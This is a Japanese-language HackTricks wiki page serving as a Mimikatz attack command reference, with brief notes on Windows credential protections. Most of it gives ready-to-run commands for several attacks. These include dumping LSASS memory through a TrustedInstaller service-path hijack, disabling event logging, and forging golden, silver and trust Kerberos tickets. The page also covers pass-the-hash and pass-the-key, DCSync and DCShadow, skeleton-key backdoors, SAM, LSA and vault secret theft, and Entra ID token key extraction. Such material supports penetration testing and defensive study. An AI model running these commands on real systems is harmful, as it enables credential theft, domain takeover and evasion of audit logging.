# Mimikatz

{{#include ../../banners/hacktricks-training.md}}


**このページは [adsecurity.org](https://adsecurity.org/?page_id=1821) のページを基にしています**。詳しい情報については原文を確認してください！<sup>[[3]](#references)</sup>

## メモリ内の LM と Clear-Text

Windows 8.1 および Windows Server 2012 R2 以降、credential theft から保護するため、重要な対策が実装されています。

- **LM hashes と plain-text passwords** は、security を強化するため、メモリに保存されなくなりました。LSASS に "clear-text" passwords が cache されないように Digest Authentication を無効化するには、特定の registry setting _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest "UseLogonCredential"_ を DWORD 値 `0` に設定する必要があります。

- **LSA Protection** は、不正な memory reading や code injection から Local Security Authority (LSA) process を保護するために導入されました。これは LSASS を protected process としてマークすることで実現されます。LSA Protection を有効化するには、以下を実施します。
1. _HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa_ の registry を変更し、`RunAsPPL` を `dword:00000001` に設定する。
2. 管理対象デバイス全体でこの registry change を強制する Group Policy Object (GPO) を実装する。

これらの保護にもかかわらず、Mimikatz などの tools は特定の drivers を使用して LSA Protection を回避できます。ただし、このような操作は event logs に記録される可能性が高くなります。

Modern workstations では、この点がさらに重要です。多くの Windows 11 22H2+ および Windows Server 2025 の domain-joined、non-DC systems では **Credential Guard がデフォルトで有効** になっており、fresh Windows 11 22H2+ installs では **LSASS-as-PPL がデフォルトで有効** になっています。実際には、`sekurlsa::logonpasswords` で取得できる情報は、以前の tradecraft が想定していたより少ないことが多く、operators は **offline minidumps**、**Kerberos key extraction (`sekurlsa::ekeys`)**、または **CloudAP/PRT-oriented modules** へ pivot するケースが増えています。protection 側については、[Windows credentials protections](credentials-protections.md) を確認してください。

### SeDebugPrivilege Removal への対策

Administrators は通常 SeDebugPrivilege を持っており、これによって programs を debug できます。この privilege は、不正な memory dumps を防ぐために制限できます。memory dumps は、attackers がメモリから credentials を抽出する際によく使用する technique です。しかし、この privilege を削除しても、TrustedInstaller account は customized service configuration を使用して memory dumps を実行できます：
```bash
sc config TrustedInstaller binPath= "C:\\Users\\Public\\procdump64.exe -accepteula -ma lsass.exe C:\\Users\\Public\\lsass.dmp"
sc start TrustedInstaller
```
これにより `lsass.exe` のメモリをファイルにダンプでき、その後、別のシステムで分析してcredentialsを抽出できます:
```
# privilege::debug
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonpasswords
```
## Mimikatz Options

Mimikatz におけるイベントログの改ざんには、主にイベントログの消去と、新しいイベントが記録されないように Event service にパッチを適用する2つの操作があります。以下は、これらの操作を実行するコマンドです。

#### Clearing Event Logs

- **Command**: この操作はイベントログを削除し、悪意のある活動の追跡を困難にすることを目的としています。
- Mimikatz の標準ドキュメントには、コマンドラインから直接イベントログを消去するコマンドはありません。ただし、イベントログの操作では通常、Mimikatz 外部のシステムツールまたはスクリプトを使用して、特定のログを消去します（例: PowerShell または Windows Event Viewer）。

#### Experimental Feature: Patching the Event Service

- **Command**: `event::drop`
- この experimental command は、Event Logging Service の動作を変更し、新しいイベントが記録されないようにするものです。
- Example: `mimikatz "privilege::debug" "event::drop" exit`

- `privilege::debug` command は、システムサービスを変更するために必要な権限で Mimikatz が動作することを保証します。
- その後、`event::drop` command が Event Logging service にパッチを適用します。

### Kerberos Ticket Attacks

以下のコマンドを syntax の簡単な確認として使用してください。[golden tickets](../active-directory-methodology/golden-ticket.md)、[silver tickets](../active-directory-methodology/silver-ticket.md)、[diamond tickets](../active-directory-methodology/diamond-ticket.md)、[over-pass-the-hash / pass-the-key](../active-directory-methodology/over-pass-the-hash-pass-the-key.md) の専用ページには、最新の AES/PAC/opsec に関する注意点が記載されています。

### Golden Ticket Creation

Golden Ticket を使用すると、ドメイン全体へのアクセスを偽装できます。主要な command と parameters:

- Command: `kerberos::golden`
- Parameters:
- `/domain`: ドメイン名。
- `/sid`: ドメインの Security Identifier (SID)。
- `/user`: 偽装する username。
- `/krbtgt`: ドメインの KDC service account の NTLM hash。
- `/ptt`: ticket を memory に直接 inject します。
- `/ticket`: 後で使用するために ticket を保存します。

Example:
```bash
mimikatz "kerberos::golden /user:admin /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:ntlmhash /ptt" exit
```
### Silver Ticket Creation

Silver Tickets は特定の service への access を付与します。主な command と parameters:

- Command: Golden Ticket と同様ですが、特定の service を対象にします。
- Parameters:
- `/service`: 対象とする service（例: cifs、http）。
- その他の parameters は Golden Ticket と同様です。

例:
```bash
mimikatz "kerberos::golden /user:user /domain:example.com /sid:S-1-5-21-123456789-123456789-123456789 /target:service.example.com /service:cifs /rc4:ntlmhash /ptt" exit
```
### Trust Ticket Creation

Trust Ticket は、信頼関係を利用してドメイン間のリソースにアクセスするために使用されます。主なコマンドとパラメータ:

- コマンド: Golden Ticket と同様ですが、信頼関係用です。
- パラメータ:
- `/target`: 対象ドメインの FQDN。
- `/rc4`: trust account の NTLM hash。

例:
```bash
mimikatz "kerberos::golden /domain:child.example.com /sid:S-1-5-21-123456789-123456789-123456789 /sids:S-1-5-21-987654321-987654321-987654321-519 /rc4:ntlmhash /user:admin /service:krbtgt /target:parent.example.com /ptt" exit
```
### Additional Kerberos Commands

- **Listing Tickets**:

- Command: `kerberos::list`
- 現在のユーザーセッションにおけるすべての Kerberos tickets を一覧表示します。

- **Pass the Cache**:

- Command: `kerberos::ptc`
- cache files から Kerberos tickets を注入します。
- Example: `mimikatz "kerberos::ptc /ticket:ticket.kirbi" exit`

- **Pass the Ticket**:

- Command: `kerberos::ptt`
- 別のセッションで Kerberos ticket を使用できるようにします。
- Example: `mimikatz "kerberos::ptt /ticket:ticket.kirbi" exit`

- **Purge Tickets**:
- Command: `kerberos::purge`
- セッションからすべての Kerberos tickets を消去します。
- ticket manipulation commands を使用する前に、競合を避けるために役立ちます。

### Over-Pass-the-Hash / Pass-the-Key

`RC4` が無効化されているか信頼できない場合、Mimikatz は NT hash だけを使用する代わりに、**AES128/AES256 Kerberos keys** を現在の logon session に patch できます。これは、`sekurlsa::pth` を NTLM 専用として扱うよりも、modern domains に適しています。<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::ekeys" exit
mimikatz "sekurlsa::pth /user:svc_sql /domain:corp.local /aes256:<AES256_HEX> /run:powershell.exe" exit
mimikatz "sekurlsa::pth /user:administrator /domain:corp.local /ntlm:<NT_HASH> /impersonate" exit
```
`/impersonate` は新しいコンソールを生成せず、現在のプロセスを再利用します。これにより、同じコンテキストで `lsadump::dcsync` などをすぐに実行したい場合に便利です。

### Active Directory の改ざん

- **DCShadow**: AD オブジェクトを操作するため、一時的にマシンを DC として動作させます。[DCShadow](../active-directory-methodology/dcshadow.md) を参照してください。

- `mimikatz "lsadump::dcshadow /object:targetObject /attribute:attributeName /value:newValue" exit`

- **DCSync**: DC を模倣してパスワードデータを要求します。[DCSync](../active-directory-methodology/dcsync.md) を参照してください。
- `mimikatz "lsadump::dcsync /user:targetUser /domain:targetDomain" exit`

### Credential Access

- **LSADUMP::LSA**: LSA から認証情報を抽出します。

- `mimikatz "lsadump::lsa /inject" exit`

- **LSADUMP::NetSync**: コンピューターアカウントのパスワードデータを使用して DC を偽装します。

- _元のコンテキストには NetSync 用の具体的なコマンドはありません。_

- **LSADUMP::SAM**: ローカル SAM データベースにアクセスします。

- `mimikatz "lsadump::sam" exit`

- **LSADUMP::Secrets**: レジストリに保存された secrets を復号します。

- `mimikatz "lsadump::secrets" exit`

- **LSADUMP::SetNTLM**: ユーザーに新しい NTLM hash を設定します。

- `mimikatz "lsadump::setntlm /user:targetUser /ntlm:newNtlmHash" exit`

- **LSADUMP::Trust**: trust の認証情報を取得します。
- `mimikatz "lsadump::trust" exit`

### Cloud credentials / Entra ID

**Entra ID** または **hybrid-joined** のホストでは、`sekurlsa::cloudap` により LSASS からキャッシュされた **Primary Refresh Token (PRT)** の情報を取得できる場合があります。関連する Proof-of-Possession key がソフトウェアで保護されている場合、`dpapi::cloudapkd` により、後続の **Pass-the-PRT** ワークフローに必要な key material（clear/derived）を導出できます。<sup>[[1]](#references)</sup>
```bash
mimikatz "privilege::debug" "sekurlsa::cloudap" exit
mimikatz "dpapi::cloudapkd /keyvalue:<ProofOfPossessionKey> /unprotect" exit
mimikatz "dpapi::cloudapkd /context:<CONTEXT> /derivedkey:<DERIVED_KEY> /prt:<PRT>" exit
```
これは key が TPM-backed の場合、はるかに困難になりますが、hybrid endpoint では確認する価値があります。cached CloudAP data は、classic `wdigest` output よりも興味深い可能性があります。<sup>[[2]](#references)</sup> cloud-side abuse chain については、[Pass the PRT](https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/pass-the-prt.html) を参照してください。

### その他

- **MISC::Skeleton**: DC の LSASS に backdoor を Inject します。
- `mimikatz "privilege::debug" "misc::skeleton" exit`

### Privilege Escalation

- **PRIVILEGE::Backup**: backup rights を取得します。

- `mimikatz "privilege::backup" exit`

- **PRIVILEGE::Debug**: debug privileges を取得します。
- `mimikatz "privilege::debug" exit`

### Credential Dumping

- **SEKURLSA::LogonPasswords**: logged-on users の credentials を表示します。

- `mimikatz "sekurlsa::logonpasswords" exit`

- **SEKURLSA::Tickets**: memory から Kerberos tickets を抽出します。
- `mimikatz "sekurlsa::tickets /export" exit`

### SID と Token の操作

- **SID::add/modify**: SID と SIDHistory を変更します。

- Add: `mimikatz "sid::add /user:targetUser /sid:newSid" exit`
- Modify: _元の context には modify 用の specific command はありません。_

- **TOKEN::Elevate**: tokens を impersonate します。
- `mimikatz "token::elevate /domainadmin" exit`

### Terminal Services

- **TS::MultiRDP**: 複数の RDP sessions を許可します。

- `mimikatz "ts::multirdp" exit`

- **TS::Sessions**: TS/RDP sessions を一覧表示します。
- _元の context には TS::Sessions 用の specific command はありません。_

### Vault

- Windows Vault から passwords を抽出します。
- `mimikatz "vault::cred /patch" exit`


## 参考資料

- [1] [The Hacker Tools – Mimikatz modules](https://tools.thehacker.recipes/mimikatz/modules/)
- [2] [Synacktiv – WHFB and Entra ID: Say Hello to your new cache flow](https://www.synacktiv.com/en/publications/whfb-and-entra-id-say-hello-to-your-new-cache-flow)
- [3] [Mimikatz command reference](https://adsecurity.org/?page_id=1821)

{{#include ../../banners/hacktricks-training.md}}
